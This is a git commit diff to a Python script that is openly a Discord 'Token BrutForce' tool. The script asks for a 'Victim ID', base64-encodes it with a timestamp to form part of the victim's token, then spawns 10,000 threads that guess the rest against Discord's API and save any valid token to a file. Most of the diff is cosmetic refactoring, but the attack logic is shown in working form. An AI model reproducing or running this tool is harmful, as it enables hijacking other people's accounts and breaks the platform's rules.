333d1427b8dd4ce0491d26cfff8708bdd818ec9b
AstraaDev <43183806+AstraaDev@users.noreply.github.com>
2021-10-11 18:30:23 +0200

    Add files via upload

--- Additional_File/8_TokenBrutForce/brutforcetoken.py
+++ Additional_File/8_TokenBrutForce/brutforcetoken.py
@@ -6,11 +6,12 @@ from discord.ext import commands
 from discord.ext.commands import Bot
 from plyer import notification
 
-def main():
-  ctypes.windll.kernel32.SetConsoleTitleW("Token BrutForce - Made by Astraa")
-  brutforce()
-  print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter your own account token: """)
-  TOKEN = str(input(f"""\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token: """))
+def brutforce():
+  os.system(f'title Token BrutForce - Made by Astraa')
+  os.system('cls')
+  brutforcetitle()
+  print(f"""{y}[{w}+{y}]{w} Enter your own account token: """)
+  TOKEN = str(input(f"""\n{y}[{b}#{y}]{w} Token: """))
 
   def notifyMe(title, message):
     notification.notify(
@@ -20,8 +21,8 @@ def main():
 
   class MyClient(discord.Client):
     async def on_ready(self):
-      print(f"""\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter the Victim's ID: """)
-      userid = input(f"""\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Victim ID: """)
+      print(f"""\n\n{y}[{w}+{y}]{w} Enter the Victim's ID: """)
+      userid = input(f"""\n{y}[{b}#{y}]{w} Victim ID: """)
       try:
         global user
         user = await client.fetch_user(int(userid))
@@ -31,17 +32,17 @@ def main():
         encodedid = str(encodedBytes, "utf-8")
         encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
         encodedstamp = str(encodedBytes, "utf-8")
-        print(f"""\n\n\n\n\n\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Attempting to crack {user}'s token""")
-        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to Valid""")
+        print(f"""\n\n\n\n\n\n\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} Attempting to crack {user}'s token""")
+        input(f"""{y}[{b}#{y}]{w} Press ENTER to Valid""")
         os.system('cls')
         time.sleep(1)
         for i in range(10000):
           thr(target = gen, args = (encodedid, encodedstamp)).start()
       except:
-        print(f"""      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Your entry is invalid !""")
+        print(f"""      {y}[{Fore.LIGHTRED_EX }!{y}]{w} Your entry is invalid !""")
         time.sleep(2)
         os.system('cls')
-        exit(0)
+        main()
 
   def gen(encodedid, encodedstamp):
     while True:
@@ -53,22 +54,22 @@ def main():
       r = req.get(url, headers=headers)
       if r.status_code == 200:
           print(f'{token} : Valid')
-          notifyMe(f"""{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}]{Fore.GREEN} VALID TOKEN{Fore.WHITE} : {token}""")
+          notifyMe(f"""{w}[{Fore.GREEN}!{w}]{Fore.GREEN} VALID TOKEN{w} : {token}""")
           f = open("temp/BrutForceToken.txt", "a")
           f.write(token)
           f.close() 
-          exit(0)
+          main()
       else:
-          print(f"""{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.RED} INVALID TOKEN{Fore.WHITE} : {token}""")
+          print(f"""{w}[{Fore.RED}!{w}]{Fore.RED} INVALID TOKEN{w} : {token}""")
 
   try:
     token = os.environ.get(TOKEN)
     client = MyClient()
     client.run(TOKEN, bot=False)
   except:
-    print(f"""      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } There is a problem with your Token.""")
+    print(f"""      {y}[{Fore.LIGHTRED_EX }!{y}]{w} There is a problem with your Token.""")
     time.sleep(2)
     os.system('cls')
-    exit(0)
+    main()
 
-main()
+brutforce()
